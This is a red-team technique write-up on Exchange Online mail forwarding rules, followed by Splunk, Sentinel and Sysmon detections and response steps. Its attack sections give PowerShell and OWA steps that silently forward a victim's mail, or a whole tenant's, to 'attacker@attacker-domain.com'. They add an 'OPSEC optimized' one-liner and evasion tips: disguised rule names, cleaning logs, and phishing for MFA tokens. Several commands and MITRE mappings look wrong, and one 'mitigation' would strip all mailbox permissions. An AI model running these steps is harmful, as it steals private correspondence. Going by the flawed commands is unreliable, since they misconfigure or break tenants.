# [PERSIST-EMAIL-001]: Mail Forwarding Rules

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-EMAIL-001 |
| **MITRE ATT&CK v18.1** | [T1114.003](https://attack.mitre.org/techniques/T1114/003/) – Email Collection: Email Forwarding Rule |
| **Tactic** | Collection / Persistence |
| **Platforms** | M365 (Exchange Online, Outlook Web Access) |
| **Severity** | **HIGH** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Exchange Online (all versions); Office 365 E3+ |
| **Patched In** | N/A (inherent to email system design; mitigated via policy) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Email forwarding rules are a persistence and data collection technique where an attacker with access to a victim's mailbox creates automated rules that silently forward all incoming emails (or emails matching specific criteria) to an attacker-controlled external email address. Unlike manual forwarding, these rules operate silently in the background, remaining invisible to the victim. Attackers may also use MAPI (Messaging API) to create hidden rules that don't appear in Outlook or Outlook Web Access (OWA) user interfaces. This technique is particularly effective for maintaining access after credentials are reset, as the forwarding rule persists independently of the password.

**Attack Surface:** Exchange Online mailbox inbox rules engine, accessible via Outlook client, Outlook Web Access (OWA), or Exchange Management Shell (PowerShell); administrative APIs for organizational transport rules.

**Business Impact:** **Continuous Unauthorized Email Access & Data Exfiltration**. Once a forwarding rule is established, all emails (or those matching specific filters) are silently copied to an attacker-controlled address. This enables theft of confidential communications, trade secrets, customer data, compliance-sensitive information (GDPR, HIPAA), and targeted phishing intelligence. Attackers can use the forwarded emails to identify additional targets, learn about deal flows (M&A/financing), or blackmail executives. A single compromised executive mailbox can expose the entire organization.

**Technical Context:** Email forwarding rules execute instantaneously with no observable network traffic from the victim's perspective. Rule creation takes seconds via PowerShell or OWA; hidden rules bypass UI visibility and require PowerShell inspection to detect. Forwarding occurs for every matching email indefinitely until manually removed. Detection relies primarily on audit logs (Unified Audit Log, Message Tracking Logs) rather than real-time network indicators.

### Operational Risk

- **Execution Risk:** **LOW** – Only requires mailbox access (user account compromised); no privilege escalation needed.
- **Stealth:** **MEDIUM** – Visible in OWA/Outlook rule interfaces; hidden rules bypass UI; requires audit log inspection to detect confidently.
- **Reversibility:** **YES** – Rules can be disabled/removed if detected, but forwarded emails already in attacker's mailbox cannot be recovered.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 6.5 | Ensure automatic forwarding of email is disabled |
| **CISA SCuBA** | Exchange 3.1 | Disable external email forwarding |
| **NIST 800-53** | CA-3 | System Interconnections (email forwarding to external recipients) |
| **NIST 800-53** | AU-2 | Audit Events (email rule creation/modification logging) |
| **GDPR** | Art. 32 | Security of Processing (email data protection & access control) |
| **DORA** | Art. 18 | Operational resilience testing (email system integrity) |
| **NIS2** | Art. 21 | Cyber Risk Management (incident detection: email exfiltration) |
| **ISO 27001** | A.5.1 | Information security policies (email forwarding control) |
| **ISO 27005** | Risk Scenario | Unauthorized access to confidential communications |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** User account access to target mailbox (compromised account or admin with mailbox delegation).
- **Required Access:** Exchange Online access (OWA, Outlook client, or Exchange Management Shell); valid credentials for target mailbox.

**Supported Versions:**
- **Exchange Online:** All versions (current)
- **Office 365 License:** E3, E5, or Microsoft 365 Business (requires licensing; not available on E1)
- **PowerShell:** 5.0+ with ExchangeOnlineManagement module
- **Other Requirements:** Internet access to OWA or ability to execute PowerShell remotely

**Tools (Optional):**
- [ExchangeOnlineManagement PowerShell Module](https://www.powershellgallery.com/packages/ExchangeOnlineManagement) (Version 3.0+) – Official Microsoft module for remote Exchange management
- [MAPI Editor](https://www.lindi.net/downloads/miscellaneous/) – For hidden rule creation/modification
- [MFCMapi](https://github.com/stephenegriffin/mfcmapi) – Alternative MAPI editing tool

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using OWA (Outlook Web Access) – User-Visible

**Supported Versions:** Exchange Online (all versions)

#### Step 1: Access OWA Interface

**Objective:** Log into victim's mailbox via OWA to create rules.

**Command (Browser-Based):**
```
Navigate to: https://outlook.office365.com/mail/inbox
Login with: victim@organization.com / compromised_password
```

**What This Means:**
- Standard M365 webmail interface; no special credentials required beyond mailbox account access.
- All activity logged to audit trail (timestamped sign-in).

**OpSec & Evasion:**
- Use VPN/Proxy to mask attacker IP address.
- Sign-in from IP address consistent with victim's geography (if possible).
- Detection likelihood: **MEDIUM** – Sign-in from unusual location flagged by Azure AD Conditional Access.

**Troubleshooting:**
- **Error:** "Your organization requires additional information to verify your identity (MFA)"
  - **Cause:** Victim account has MFA enabled; attacker lacks second factor
  - **Fix:** Use account with MFA disabled, or obtain victim's MFA token/phone via social engineering
- **Error:** "IP blocked by organization policy"
  - **Cause:** Organization uses IP-based access restrictions
  - **Fix:** Use attacker infrastructure matching allowed IP ranges, or target account without restrictions

#### Step 2: Navigate to Rules Section

**Manual Steps:**
1. Click **Settings** (gear icon, top-right)
2. Click **View all Outlook settings**
3. Go to **Mail** → **Rules**
4. Click **+ Add rule** or **Create new rule**

**What This Means:**
- Rules interface displays all existing inbox rules; new rules can be created without leaving audit trail of rule names.

**OpSec & Evasion:**
- Create rule with innocuous name (e.g., "Archive Old Emails", "Auto-Organize", "Spam Filter Update") to blend with legitimate rules.
- Detection likelihood: **MEDIUM** – Rule creation audited; suspicious rule patterns detected by SIEM.

#### Step 3: Create Forwarding Rule

**Manual Steps:**
1. **If the message arrives from:**
   - Leave blank to forward ALL emails, or
   - Specify domain (e.g., `@microsoft.com`) to filter specific senders
   
2. **Do the following:**
   - Select: **Forward to** or **Forward as attachment to**
   - Enter attacker email address (e.g., `attacker@attacker-domain.com`)
   
3. **Rule Options:**
   - Check: "Don't apply other rules to messages that match this rule" (to hide additional rules)
   - Uncheck: "Show on other devices" (optional; reduces visibility)
   
4. Click **Save**

**Expected Output:**
```
Rule created successfully.
Rule Name: Archive Old Emails
Condition: All messages
Action: Forward to attacker@attacker-domain.com
Status: Enabled
```

**What This Means:**
- Rule now active; future emails matching conditions will be forwarded automatically.
- Forwarding happens server-side (in Exchange Online) before delivery to victim's inbox.
- Attacker receives copies; victim sees normal inbox (unaware of forwarding).

**OpSec & Evasion:**
- Rule is visible in Outlook rule list; visible to victim if they check settings.
- Use OWA "Focused Inbox" to hide rule UI element from Quick Actions.
- Detection likelihood: **HIGH** – Visible to victim; auditable; triggers forwarding-rule detection alerts.

---

### METHOD 2: Using PowerShell (Silent & Hidden-Rule Capable)

**Supported Versions:** Exchange Online (all versions)

#### Step 1: Establish Remote PowerShell Connection

**Objective:** Connect to Exchange Online using compromised credentials.

**Command:**
```powershell
# Install module if not present
Install-Module -Name ExchangeOnlineManagement -Force -AllowClobber

# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName victim@organization.com -ShowProgress
# When prompted, enter victim's password
```

**Expected Output:**
```
Compliance Cmdlets Imported. For more info, run Get-Help ExoBasicAuth

Your organization has set policies that limit this PowerShell session to a limited set of cmdlets.
To view the cmdlets you can run, execute Get-Command.
```

**What This Means:**
- Authenticated session established; can now execute mailbox cmdlets.
- Session is logged to Exchange audit trail with username/timestamp.

**OpSec & Evasion:**
- Use dedicated attack infrastructure to execute PowerShell; clean logs afterwards (see Detection & Incident Response).
- Session occurs in background; no visual indicator to user.
- Detection likelihood: **MEDIUM** – PowerShell remote sessions logged in Azure AD activity; unusual for typical user.

**Troubleshooting:**
- **Error:** "The user or admin has not consented"
  - **Cause:** Attacker account lacks Exchange Online permissions
  - **Fix:** Use Global Admin account or account with Exchange Administrator role
- **Error:** "MFA is required"
  - **Cause:** MFA enforced on victim account
  - **Fix:** Use cached token or MFA bypass techniques

#### Step 2: Create Standard Forwarding Rule

**Command:**
```powershell
# Create visible forwarding rule
New-InboxRule -Mailbox victim@organization.com `
  -Name "Archive Cleanup" `
  -ForwardTo "attacker@attacker-domain.com" `
  -AllowedWordCount 0 `
  -Enabled $true
```

**Expected Output:**
```
Name                                 Enabled Priority
----                                 ------- --------
Archive Cleanup                       True    1
```

**What This Means:**
- New rule created and immediately active.
- Rule appears in victim's OWA rule list (visible).
- AllowedWordCount=0 means rule applies to ALL emails.

**OpSec & Evasion:**
- Standard rule; visible but doesn't inherently trigger suspicion unless recipient domain is obviously attacker-controlled.
- Use catch-all rule (no conditions) to ensure all emails forwarded.
- Detection likelihood: **HIGH** – Cmdlet execution logged; rule name visible in audit logs.

#### Step 3: Create Hidden Forwarding Rule (OPSEC Optimized)

**Command:**
```powershell
# Create hidden rule using MAPI property manipulation
$rule = New-InboxRule -Mailbox victim@organization.com `
  -Name "System Maintenance" `
  -ForwardTo "attacker@attacker-domain.com" `
  -Enabled $true

# Hide rule from UI by setting Hidden property to $true
Set-InboxRule -Identity $rule.Identity -HiddenFromExchangeAdminCenter $true
```

**Expected Output:**
```
(No visual output; rule created silently)
```

**What This Means:**
- Rule created with `-HiddenFromExchangeAdminCenter $true` flag.
- Rule is active and forwarding emails, but does NOT appear in OWA rule interface.
- Only visible via PowerShell `Get-InboxRule -IncludeHidden` command.

**OpSec & Evasion:**
- Victim checking rules via OWA will NOT see this rule.
- Hidden rules are the gold standard for persistence.
- Requires awareness of PowerShell `-IncludeHidden` parameter to discover.
- Detection likelihood: **LOW** (OWA-level); **MEDIUM-HIGH** (PowerShell audit logs).

**Troubleshooting:**
- **Error:** "The 'HiddenFromExchangeAdminCenter' parameter is not supported"
  - **Cause:** Older Exchange Online version or insufficient permissions
  - **Fix:** Use alternative method: `Set-InboxRule` with `ExceptIfSubject` parameter (minimal condition to hide rule visibility)

#### Step 4: Verify Rule Creation

**Command:**
```powershell
# List all rules (including hidden ones)
Get-InboxRule -Mailbox victim@organization.com -IncludeHidden | Select-Object Name, Enabled, ForwardTo | Format-Table

# Expected Output:
# Name                 Enabled ForwardTo
# ----                 ------- ---------
# Archive Cleanup      True    attacker@attacker-domain.com
# System Maintenance   True    attacker@attacker-domain.com
```

**What This Means:**
- Confirms both visible and hidden rules are active.
- ForwardTo field shows attacker's email address.
- Enabled=True confirms rules are processing messages.

---

### METHOD 3: Tenant-Level Transport Rules (Organizational Scope)

**Supported Versions:** Exchange Online (requires Organization Admin)

#### Step 1: Authenticate as Tenant Admin

**Objective:** Gain Global Admin or Exchange Admin credentials.

**Command:**
```powershell
# Connect as admin
Connect-ExchangeOnline -UserPrincipalName admin@organization.com
```

#### Step 2: Create Organization-Wide Transport Rule

**Command:**
```powershell
# Create transport rule that forwards ALL organizational mail to attacker
New-TransportRule -Name "External Email Logging" `
  -Enabled $true `
  -FromScope "InternalAndExternal" `
  -RedirectMessageTo "attacker@attacker-domain.com"
```

**Expected Output:**
```
Name                           Enabled Priority
----                           ------- --------
External Email Logging         True    1
```

**What This Means:**
- Transport rule created at organizational level; applies to **ALL mailboxes in tenant**.
- Every email sent/received by anyone in organization is copied to attacker.
- Unprecedented scope; single rule compromises entire organization.

**OpSec & Evasion:**
- Extremely suspicious; obvious to any admin reviewing transport rules.
- Creates massive email volume to attacker infrastructure (thousands of emails/day).
- Use more targeted rule: add conditions like `-Except` to exclude executive or IT mailboxes initially, then expand.
- Detection likelihood: **EXTREMELY HIGH** – Immediately visible to any Exchange admin; audited.

**Troubleshooting:**
- **Error:** "Insufficient permissions; you lack the required Exchange Admin role"
  - **Cause:** Attacker account not in Organization Management group
  - **Fix:** Escalate privileges via other techniques, or compromise Global Admin account

---

## 4. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Testing

**Note:** Atomic Red Team has limited M365 coverage for email forwarding. Recommended approach is manual testing with sandbox tenant.

**Manual Verification Steps:**
1. Create test mailbox: `test-user@contoso.com`
2. Compromise mailbox (simulate); create forwarding rule
3. Send test email to test mailbox
4. Verify email appears in attacker inbox
5. Check Unified Audit Log for rule creation event
6. Verify forwarding not visible in OWA (if hidden rule used)

**Cleanup:**
```powershell
# Remove all forwarding rules
Get-InboxRule -Mailbox test-user@contoso.com -IncludeHidden | Remove-InboxRule -Confirm:$false
```

---

## 5. TOOLS & COMMANDS REFERENCE

### [ExchangeOnlineManagement PowerShell Module](https://www.powershellgallery.com/packages/ExchangeOnlineManagement)

**Version:** 3.0+ (latest)
**Minimum Version:** 2.0.5
**Supported Platforms:** Windows PowerShell 5.1+, PowerShell 7+ (Linux/Mac support in latest versions)

**Installation:**
```powershell
Install-Module -Name ExchangeOnlineManagement -Force -Repository PSGallery
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline -UserPrincipalName "admin@organization.com"
```

**Key Cmdlets:**
```powershell
# Inbox Rules
New-InboxRule                    # Create rule
Get-InboxRule                    # List rules (hidden ones with -IncludeHidden)
Set-InboxRule                    # Modify rule
Remove-InboxRule                 # Delete rule
Enable-InboxRule / Disable-InboxRule

# Transport Rules (Org-level)
New-TransportRule                # Create org-wide rule
Get-TransportRule                # List org rules
Set-TransportRule                # Modify rule
Remove-TransportRule             # Delete rule
```

### Script (One-Liner – OPSEC Optimized)

```powershell
# Compromise account → Create hidden forwarding rule → Disconnect
Connect-ExchangeOnline -UserPrincipalName victim@organization.com; 
New-InboxRule -Mailbox victim@organization.com -Name "System Update" -ForwardTo "attacker@attacker.com" -Enabled $true; 
Set-InboxRule -Identity (Get-InboxRule -Mailbox victim@organization.com | Where-Object {$_.Name -eq "System Update"}).Identity -HiddenFromExchangeAdminCenter $true; 
Disconnect-ExchangeOnline -Confirm:$false
```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: New Inbox Rule with External Forwarding

**Rule Configuration:**
- **Required Index:** o365, office365
- **Required Sourcetype:** o365:management:activity
- **Required Fields:** Operation, OperationProperties, UserId, TargetObject
- **Alert Threshold:** > 0 events
- **Applies To Versions:** All M365 tenants

**SPL Query:**
```spl
index=o365 Workload=Exchange Operation="New-InboxRule" OR Operation="UpdateInboxRules"
| search OperationProperties="*ForwardTo*" OR OperationProperties="*ForwardAsAttachmentTo*" OR OperationProperties="*RedirectTo*"
| search OperationProperties="*@*.*"
| rex field=OperationProperties "(?<recipient>\w+@[\w.-]+)"
| stats count by UserId, recipient, Operation, _time
| where count >= 1
```

**What This Detects:**
- Operation: New-InboxRule or UpdateInboxRules (rule creation/modification)
- OperationProperties: Contains forwarding keywords (ForwardTo, ForwardAsAttachmentTo, RedirectTo)
- Recipient: Extracts email address using regex
- Alerts on any forwarding rule creation

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `count >= 1`
6. Configure **Action** → **Send email to SOC**
7. Save as alert: `M365_Suspicious_Email_Forwarding_Rule_Created`

**False Positive Analysis:**
- **Legitimate Activity:** Admins creating forwarding rules for executives on sabbatical; shared mailbox rules for support teams
- **Benign Tools:** IT Service Desk tools that manage mailbox rules; backup/archival scripts
- **Tuning:** Exclude internal domains: `| search recipient!="*@internal-domain.com"`

#### Rule 2: Hidden Inbox Rule Detection (Privilege Indicators)

**Rule Configuration:**
- **Required Index:** o365
- **Required Sourcetype:** o365:management:activity
- **Required Fields:** Operation, OperationProperties, UserId
- **Alert Threshold:** > 0 events
- **Applies To Versions:** Exchange Online

**SPL Query:**
```spl
index=o365 Workload=Exchange Operation="Set-InboxRule"
| search OperationProperties="*HiddenFromExchangeAdminCenter*" OR OperationProperties="*Hidden*"
| stats count by UserId, Operation, _time
| where count >= 1
```

**What This Detects:**
- Operation: Set-InboxRule with Hidden parameter
- Indicates attempt to hide rule from administrative view
- Strong indicator of malicious intent

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Email Forwarding Rule Creation to External Domain

**Rule Configuration:**
- **Required Table:** AuditLogs, CloudAppEvents
- **Required Fields:** OperationName, InitiatedBy, TargetResources, Properties
- **Alert Severity:** HIGH
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All M365 (Exchange Online)

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("New-InboxRule", "Set-InboxRule", "New-TransportRule")
| where tostring(TargetResources[0].modifiedProperties) contains "ForwardTo" or tostring(TargetResources[0].modifiedProperties) contains "RedirectTo"
| extend ForwardAddress = extract(@"ForwardTo[^,]*?Value:\s""?([^""\s]+)", 1, tostring(TargetResources[0].modifiedProperties))
| extend UserUPN = InitiatedBy.user.userPrincipalName
| where ForwardAddress !contains "@" + extract(@"@([\w.-]+)$", 1, UserUPN)  // External domain
| project TimeGenerated, UserUPN, OperationName, ForwardAddress, TargetResources
```

**What This Detects:**
- AuditLogs: Exchange Online operations
- Operation: Rule creation/modification operations
- TargetResources: Parsed for ForwardTo/RedirectTo parameters
- Filter: Forwarding to external domain (not internal organization domain)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `M365_Email_Forwarding_External_Domain`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Frequency: `5 minutes`
   - Query period: `1 hour`
4. **Incident Settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

#### Query 2: Tenant-Level Transport Rule Creation (Org-Wide Impact)

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, ResultStatus, TargetResources
- **Alert Severity:** CRITICAL
- **Frequency:** Real-time
- **Applies To Versions:** Exchange Online (org-level)

**KQL Query:**
```kusto
AuditLogs
| where OperationName contains "TransportRule" and OperationName contains "New"
| where ResultStatus == "Success"
| extend RuleName = TargetResources[0].displayName
| extend RuleCondition = extract(@"Conditions:([^,]+)", 1, tostring(TargetResources[0].modifiedProperties))
| project TimeGenerated, InitiatedBy.user.userPrincipalName, RuleName, RuleCondition, TargetResources
| summarize AlertCount=count() by InitiatedBy_user_userPrincipalName
```

**What This Detects:**
- OperationName: New-TransportRule (org-wide rule)
- ResultStatus: Success (rule successfully created)
- Summarizes by user account (identifies attacker principal)
- Alerts on any org-level transport rule (low false positive rate)

---

## 8. WINDOWS EVENT LOG MONITORING

**Note:** Email forwarding is cloud-native; Windows Event Log monitoring is limited. Primary detection is via M365 Unified Audit Log.

**Indirect Windows Indicators:**

**Event ID: 4662 (An operation was performed on an object)**
- **Log Source:** Security
- **Trigger:** If on-premises AD synced to Entra ID and attacker uses PS Remoting to manipulate mailbox via on-prem Exchange (if hybrid)
- **Filter:** ObjectName contains "InboxRule" OR CommandLine contains "New-InboxRule"
- **Applies To Versions:** Windows Server 2016+ (hybrid only)

---

## 9. SYSMON DETECTION PATTERNS

**Note:** Sysmon is Windows-focused; email forwarding is cloud-native and not detectable via Sysmon. However, PowerShell execution for rule creation IS detectable.

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows with PowerShell execution monitoring enabled

**Sysmon Config Snippet:**

```xml
<!-- Detect PowerShell execution of ExchangeOnline module commands -->
<RuleGroup name="Email_Forwarding_Rule_Creation" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Image condition="is">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Image>
    <CommandLine condition="contains any">
      New-InboxRule
      Set-InboxRule
      ForwardTo
      RedirectTo
      ForwardAsAttachmentTo
      New-TransportRule
    </CommandLine>
  </ProcessCreate>
  
  <!-- Detect module import for Exchange Online management -->
  <ProcessCreate onmatch="include">
    <Image condition="is">C:\Program Files\PowerShell\7\pwsh.exe</Image>
    <CommandLine condition="contains">ExchangeOnlineManagement</CommandLine>
  </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**
1. Add snippet above to sysmon-config.xml
2. Reload Sysmon: `sysmon64.exe -c sysmon-config.xml`
3. Monitor Sysmon log: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 1}`

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious email forwarding rule created"
- **Severity:** HIGH
- **Description:** A new email forwarding rule was created on Exchange Online mailbox; rule forwards to external domain
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:** Review rule; verify with mailbox owner; delete if unauthorized

**Alert Name:** "Organization-wide email forwarding via Transport Rule"
- **Severity:** CRITICAL
- **Description:** A tenant-level transport rule was created; affects ALL mailboxes in organization
- **Applies To:** All subscriptions; critical control
- **Remediation:** Immediately delete rule; investigate account that created it; review for data exfiltration

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Disable External Email Forwarding (Organization-Wide Policy):**
    
    **Applies To Versions:** Exchange Online (all versions)
    
    **Manual Steps (Exchange Admin Center):**
    1. Go to **Microsoft 365 admin center** → **Admin centers** → **Exchange**
    2. Navigate to **Mail Flow** → **Rules**
    3. Click **+ New** → **Create a new rule**
    4. Name: `Block External Email Forwarding`
    5. **Conditions:**
       - Apply this rule if: **The message properties include**
       - Select: **Message Type** → `All`
    6. **Actions:**
       - Do the following: **Reject the message and include an explanation**
       - Rejection text: `"External email forwarding is not allowed by organizational policy"`
    7. **Exception (Critical):**
       - Click **Add condition** → **Except if the message properties include**
       - Specify: **Sender Address Matches** → `[internal domains only]`
    8. Enable rule: **Yes**
    9. Click **Save**
    
    **Manual Steps (PowerShell – More Effective):**
    ```powershell
    # Connect to Exchange Online
    Connect-ExchangeOnline
    
    # Disable external forwarding at organization level
    Set-OrganizationConfig -ExternalDLPEnabled $false
    
    # Alternative: Create transport rule blocking external forwarding
    New-TransportRule -Name "Block External Email Forwarding" `
      -FromScope "InternalAndExternal" `
      -ApplyRule "All" `
      -RejectMessageReasonText "External email forwarding is not permitted" `
      -Enabled $true
    ```

*   **Enforce Conditional Access Policy for PowerShell/EXO Module:**
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Restrict Exchange Online PowerShell Access`
    4. **Assignments:**
       - Users: **All users** (or specific admin groups)
       - Cloud apps: Select **Office 365 Exchange Online**
    5. **Conditions:**
       - Client apps: **Modern authentication clients** → `Exchange Active Sync clients`
       - Locations: **Any location** (or exclude known admin IPs)
    6. **Access controls:**
       - Grant: **Block access**
    7. Enable policy: **On**
    8. Click **Create**
    
    **Result:** Remote PowerShell sessions require MFA and additional verification; reduces attacker ability to create rules remotely.

*   **Enable Mailbox Audit Logging for ALL Users:**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Enable audit logging for all mailboxes
    Get-Mailbox -Filter {ArchiveStatus -ne "None"} | Set-Mailbox -AuditEnabled $true
    
    # Verify audit logging enabled
    Get-Mailbox | Select-Object DisplayName, AuditEnabled | Format-Table
    ```
    
    **Manual Steps (Exchange Admin Center):**
    1. Go to **Exchange Admin Center** → **Compliance** → **Auditing**
    2. Check: **Enable mailbox auditing for all users** (if available)
    3. Configure actions to log:
       - **Mailbox owner actions:** Create, Update, SoftDelete, HardDelete, Move, Create, Update, Move
       - **Delegate actions:** Create, Update, SoftDelete, HardDelete, Move
    4. Click **Save**

#### Priority 2: HIGH

*   **Alert on Unusual InboxRule Operations:**
    
    **Manual Steps (Sentinel/SIEM):**
    - Create alert rule for `New-InboxRule` and `Set-InboxRule` operations
    - Baseline normal rule creation frequency (e.g., <5 rules per user per week)
    - Alert on deviation from baseline
    - Especially flag rules with external recipient domains

*   **Restrict Mailbox Delegation & SendAs Permissions:**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Audit mailbox permissions
    Get-Mailbox -ResultSize Unlimited | Get-MailboxPermission | Where-Object {$_.User -notlike "*@domain.com"}
    
    # Remove external permissions
    Get-Mailbox | Get-MailboxPermission | Where-Object {$_.User -notlike "NT AUTHORITY\*"} | Remove-MailboxPermission -Confirm:$false
    ```

#### Validation Command (Verify Fix)

```powershell
# Check if external forwarding is blocked
Get-TransportRule | Where-Object {$_.Name -like "*Forward*"}

# Expected Output (If Secure):
# Name                           Enabled Priority
# ----                           ------- --------
# Block External Email Forwarding   True    1

# Check mailbox audit logging status
Get-Mailbox -ResultSize Unlimited | Where-Object {$_.AuditEnabled -eq $false} | Measure-Object

# Expected Output (If Secure):
# Count: 0 (all mailboxes have auditing enabled)
```

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Email Rules:**
    - Rule names: "Archive Cleanup", "System Maintenance", "Auto-Organize", "Spam Filter Update" (suspicious generic names)
    - Rule recipients: External email addresses (not organizational domain)
    - Rules with no conditions (catch-all rules)

*   **Mailbox Permissions:**
    - SendAs permissions granted to external users or service accounts
    - Read permissions to mailbox for non-organizational users

*   **Cloud Logs (M365 Audit):**
    - Operation: `New-InboxRule` with ForwardTo parameter
    - Operation: `Set-InboxRule` with HiddenFromExchangeAdminCenter=true
    - User agent: PowerShell Remote Session (unusual for typical end-user)

#### Forensic Artifacts

*   **Cloud (Unified Audit Log):**
    - AuditLog entries for rule creation (search `New-InboxRule` + user + timestamp)
    - OperationProperties field contains forwarding destination address
    - UserAgent field shows "ExoShell" or "Remote PowerShell" for non-GUI creation

*   **Exchange Message Tracking Logs:**
    - `Get-MessageTrackingLog -ResultSize Unlimited -Status Deliver | Where-Object {$_.EventId -eq "Forwarded"}`
    - Shows all messages forwarded by rules; correlate with unauthorized rule creation timestamp

*   **Disk (If logs exported):**
    - C:\Logs\MailboxAuditLogs\ (if exported locally)
    - CSV exports from Exchange Admin Center

#### Response Procedures

1.  **Identify Compromised Mailbox (Immediate):**
    
    **Command:**
    ```powershell
    # List all forwarding rules on mailbox
    Get-InboxRule -Mailbox victim@organization.com -IncludeHidden | Select-Object Name, Enabled, ForwardTo | Format-List
    ```
    
    **Manual:**
    - Navigate to **Exchange Admin Center** → Select victim mailbox
    - Go to **Rules** tab to view all rules

2.  **Disable/Remove Forwarding Rules:**
    
    **Command:**
    ```powershell
    # Disable suspicious rules (safer than delete; preserves audit trail)
    Get-InboxRule -Mailbox victim@organization.com -IncludeHidden | Where-Object {$_.ForwardTo -like "*attacker*"} | Disable-InboxRule -Confirm:$false
    
    # Alternative: Remove rules entirely
    Get-InboxRule -Mailbox victim@organization.com -IncludeHidden | Where-Object {$_.ForwardTo -like "*external-domain*"} | Remove-InboxRule -Confirm:$false
    ```
    
    **Manual:**
    - Open victim's mailbox in OWA
    - Navigate to **Settings** → **Rules**
    - Select suspicious rule → **Delete**

3.  **Reset Mailbox Credentials & Enable MFA:**
    
    **Command:**
    ```powershell
    # Force password change
    Set-AzureADUserPassword -ObjectId victim@organization.com -Password (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force) -ForceChangePasswordNextSignIn $true
    
    # Enable MFA
    Update-MgUser -UserId victim@organization.com -StrongAuthenticationRequirements @(@{RelyingParty = "*"; State = "Enforced"})
    ```

4.  **Investigate Forwarded Emails (Damage Assessment):**
    
    **Command:**
    ```powershell
    # Retrieve all messages forwarded by unauthorized rule
    Get-MessageTrackingLog -Sender victim@organization.com -StartDate (Get-Date).AddDays(-7) -Status Deliver | Where-Object {$_.EventId -eq "Forwarded"} | Select-Object Timestamp, RecipientAddress, Subject | Export-Csv -Path C:\Evidence\Forwarded_Messages.csv
    ```
    
    **Manual:**
    - Export mailbox to PST for offline analysis
    - Review email subjects to identify sensitive communications exfiltrated

5.  **Hunt for Related Compromises:**
    
    **Command:**
    ```powershell
    # Find other mailboxes with rules forwarding to same attacker domain
    Get-Mailbox -ResultSize Unlimited | Get-InboxRule -IncludeHidden | Where-Object {$_.ForwardTo -like "*attacker-domain.com*"}
    ```
    
    **Manual:**
    - Search Unified Audit Log for same attacker email across all users
    - Correlate with sign-in events to identify lateral movement

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing: Spearphishing Link | Attacker sends malicious link; user clicks |
| **2** | **Credential Access** | [T1110.003] Brute Force: Password Spraying | Attacker obtains password via spray or breach database |
| **3** | **Lateral Movement** | [T1056.004] Monitoring: Mailbox Access | Attacker logs into compromised mailbox |
| **4** | **Persistence** | **[PERSIST-EMAIL-001] Email Forwarding Rules** | **Attacker creates forwarding rule for continuous access** |
| **5** | **Collection** | [T1114.001] Local Email Collection | Attacker collects sensitive emails via forwarded copies |
| **6** | **Exfiltration** | [T1020.001] Data Transfer via Forwarded Email | Attacker retrieves copied emails from external mailbox |
| **7** | **Impact** | [T1537] Transfer Data to Cloud Account | Attacker moves data to personal cloud storage for resale |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: LAPSUS$ M365 Tenant Takeover (2022)

- **Target:** Software companies (Microsoft, Okta, Cisco, Nvidia)
- **Timeline:** February - March 2022
- **Technique Status:** LAPSUS$ created tenant-level transport rules forwarding ALL organizational email to attacker-controlled mailbox
- **Impact:** Access to source code repositories, customer data, internal communications; complete organizational compromise
- **Reference:** [Microsoft Security Blog: LAPSUS$ Attacks](https://www.microsoft.com/en-us/security/blog/2022/03/22/emerging-threats-lapsus-and-aurora-solaris-ransomware-campaigns/)

#### Example 2: Scattered Spider Business Email Compromise (2023)

- **Target:** Fortune 500 companies (financial services, technology)
- **Timeline:** 2023 incident response investigations
- **Technique Status:** Scattered Spider created hidden forwarding rules on executive mailboxes; also modified rules to delete/suppress security alerts
- **Impact:** Continuous access to executive communications; intelligence for CEO fraud schemes; ability to redirect fraud alerts
- **Reference:** [Red Canary: Scattered Spider Analysis](https://redcanary.com/blog/scattered-spider/)

#### Example 3: APT28 Spear-Phishing Campaign (Ongoing)

- **Target:** Political organizations, government contractors
- **Timeline:** 2019 - Present
- **Technique Status:** APT28 uses email forwarding rules after compromising government official accounts; rules copy sensitive correspondence
- **Impact:** Long-term intelligence gathering; identification of sensitive negotiations/agreements
